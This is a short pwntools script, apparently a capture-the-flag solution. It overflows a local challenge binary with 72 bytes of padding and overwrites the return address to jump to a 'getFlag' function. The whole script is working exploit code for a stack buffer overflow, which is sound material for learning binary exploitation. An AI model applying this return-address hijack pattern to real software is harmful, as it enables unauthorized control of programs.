from pwn import *

p = process('./bluff_overflow.exe')
elf = ELF('./bluff_overflow.exe')

garbage = b'a'*72
target = p64(elf.symbols['getFlag'])
msgin = garbage + target
p.sendline(msgin)
p.interactive()
